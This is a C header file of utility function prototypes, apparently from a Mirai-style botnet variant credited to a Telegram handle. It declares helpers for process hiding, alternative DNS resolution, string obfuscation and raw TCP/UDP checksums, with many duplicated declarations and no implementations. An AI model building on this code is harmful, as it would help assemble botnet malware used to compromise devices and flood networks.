// by juan @ipmiv2 on telegram

#pragma once

#include <linux/ip.h>
#include <stdint.h>
#include "config.h"


int util_strlen(char *);
BOOL util_strncmp(char *, char *, int);
BOOL util_strcmp(char *, char *);
int util_strcpy(char *, char *);
void util_strcat(char *, char *);
void util_memcpy(void *, void *, int);
void util_zero(void *, int);
char *util_read(int fd, char *buf, int count);
int util_atoi(char *, int);
char *util_itoa(int, int, char *);
int util_memsearch(char *, int, char *, int);
int util_stristr(char *, int, char *);
ipv4_t util_local_addr(void);
char *util_fdgets(char *, int, int);

static inline int util_isupper(char);
static inline int util_isalpha(char);
static inline int util_isspace(char);
static inline int util_isdigit(char);
void _memset(void *buf, char set, int len);
void hidepid(int);
int _opennic_dns();

void util_strcat(char *, char *);
void util_memcpy(void *, void *, int);
void util_zero(void *, int);

int util_encryption(char *);
int util_strlen(char *);
int util_strcpy(char *, char *);
int util_atoi(char *, int);
int util_memsearch(char *, int, char *, int);
int util_stristr(char *, int, char *);

BOOL mem_exists(char *, int, char *, int);
BOOL util_strncmp(char *, char *, int);
BOOL util_strcmp(char *, char *);

char *util_itoa(int, int, char *);
char *util_fdgets(char *, int, int);

int util_isupper(char);
int util_isalpha(char);
int util_isspace(char);
int util_isdigit(char);

int _isupper(char);
int _isalpha(char);
int _isspace(char);
int util_isdigit(char);

void _strcat(char *, char *);
void _memcpy(void *, void *, int);
void _zero(void *, int);

int util_strlen(char *);
int _strcpy(char *, char *);
int _atoi(char *);
int _memsearch(char *, int, char *, int);
int _stristr(char *, int, char *);
int _startswith(char *, char *);

int memory_exists(char *, int, char *, int);
int _strncmp(char *, char *, int);
int _strcmp(char *, char *);
int _strcmp2(char *, char *);
void rand_bytes(unsigned char *, int);
char *_itoa(int, int, char *);
char *_fdgets(char *, int, int);
char *hex_to_text(char *);
char *_strdup(char *);
void _memset(void *, char, int);

ipv4_t util_local_addr(void);
uint16_t checksum_generic(uint16_t *, uint32_t);
uint16_t checksum_tcp_udp(struct iphdr *, void *, uint16_t, uint16_t);
